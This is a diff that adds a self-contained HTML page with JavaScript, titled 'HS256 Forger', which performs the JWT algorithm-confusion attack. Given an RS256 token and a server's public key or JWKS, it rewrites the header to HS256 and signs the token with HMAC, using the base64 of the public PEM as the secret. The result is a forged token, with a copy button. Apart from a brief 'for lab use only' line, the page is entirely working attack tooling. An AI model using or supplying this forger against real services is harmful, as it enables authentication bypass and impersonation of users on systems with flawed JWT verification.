@@ -1,0 +1,126 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width,initial-scale=1" />
+  <title>HS256 Forger (Simple)</title>
+  <style>
+    body{font-family:system-ui,Segoe UI,Roboto,Arial;margin:18px}
+    textarea{width:100%;height:90px;font-family:monospace;padding:8px}
+    input,button{padding:8px;margin-top:8px}
+    .row{display:flex;gap:8px}
+    label{font-weight:600}
+    .small{height:40px}
+    .out{height:120px}
+    p.note{color:#555;font-size:13px}
+  </style>
+</head>
+<body>
+  <h3>HS256 Forger — simple browser tool (no backend)</h3>
+  <p class="note">Paste a valid RS256 JWT and a JWKS (or public PEM). The tool will change header alg→HS256 and sign using the public key as secret (base64 of PEM). For lab use only.</p>
+
+  <label>RS256 token (original)</label>
+  <textarea id="token"></textarea>
+
+  <label>JWKS JSON or PUBLIC PEM (must contain publicPem or be PEM)</label>
+  <textarea id="jwks"></textarea>
+
+  <div class="row">
+    <button id="forge">Generate HS256 forged token</button>
+    <button id="copy">Copy forged token</button>
+    <button id="clear">Clear</button>
+  </div>
+
+  <label>Forged token (HS256)</label>
+  <textarea id="out" class="out"></textarea>
+
+  <script>
+    // helpers
+    function b64UrlEncode(buffer) {
+      return btoa(String.fromCharCode.apply(null, new Uint8Array(buffer)))
+        .replace(/\+/g, '-')
+        .replace(/\//g, '_')
+        .replace(/=+$/, '');
+    }
+    function strToUint8Array(str){
+      return new TextEncoder().encode(str);
+    }
+    function base64Encode(str){
+      return btoa(str);
+    }
+
+    async function hmacSha256(keyBytes, data) {
+      const key = await crypto.subtle.importKey('raw', keyBytes, { name: 'HMAC', hash: 'SHA-256' }, false, ['sign']);
+      const sig = await crypto.subtle.sign('HMAC', key, strToUint8Array(data));
+      return new Uint8Array(sig);
+    }
+
+    function parseJwtParts(token){
+      const parts = token.split('.');
+      if(parts.length !== 3) throw new Error('Invalid token format');
+      return parts;
+    }
+
+    document.getElementById('forge').addEventListener('click', async ()=>{
+      try{
+        const token = document.getElementById('token').value.trim();
+        const jwksRaw = document.getElementById('jwks').value.trim();
+        if(!token) throw new Error('Provide token');
+        if(!jwksRaw) throw new Error('Provide JWKS JSON or PUBLIC PEM');
+
+        const parts = parseJwtParts(token);
+        const headerJson = JSON.parse(atob(parts[0].replace(/-/g,'+').replace(/_/g,'/')));
+        const payloadJson = JSON.parse(atob(parts[1].replace(/-/g,'+').replace(/_/g,'/')));
+
+        // new header: set alg HS256 (keep kid if exists)
+        const newHeader = Object.assign({}, headerJson, { alg: 'HS256' });
+
+        // prepare secret: accept either jwks JSON with keys[0].publicPem or raw PEM text
+        let pem = null;
+        try{
+          const maybe = JSON.parse(jwksRaw);
+          if(maybe && maybe.keys && maybe.keys[0] && maybe.keys[0].publicPem) pem = maybe.keys[0].publicPem;
+        }catch(e){ /* not JSON */ }
+        if(!pem){
+          // treat jwksRaw as PEM (allow with or without newlines)
+          pem = jwksRaw;
+        }
+        if(!pem) throw new Error('Could not read public PEM from input');
+
+        // normalize PEM (ensure \n newlines)
+        pem = pem.replace(/\\n/g,'\n').trim();
+
+        // secret = base64 of PEM (string)
+        const secret = base64Encode(pem);
+
+        // build signing input
+        const headerB64 = btoa(JSON.stringify(newHeader)).replace(/\+/g,'-').replace(/\//g,'_').replace(/=+$/,'');
+        const payloadB64 = btoa(JSON.stringify(payloadJson)).replace(/\+/g,'-').replace(/\//g,'_').replace(/=+$/,'');
+        const signingInput = headerB64 + '.' + payloadB64;
+
+        // compute HMAC using secret (as UTF-8 bytes of base64 string)
+        const keyBytes = strToUint8Array(secret);
+        const sigBytes = await hmacSha256(keyBytes, signingInput);
+        const sigB64Url = b64UrlEncode(sigBytes);
+
+        const forged = signingInput + '.' + sigB64Url;
+        document.getElementById('out').value = forged;
+      }catch(err){
+        alert(err.message || err);
+      }
+    });
+
+    document.getElementById('copy').addEventListener('click', ()=>{
+      const out = document.getElementById('out');
+      out.select();
+      document.execCommand('copy');
+    });
+
+    document.getElementById('clear').addEventListener('click', ()=>{
+      document.getElementById('token').value='';
+      document.getElementById('jwks').value='';
+      document.getElementById('out').value='';
+    });
+  </script>
+</body>
+</html>
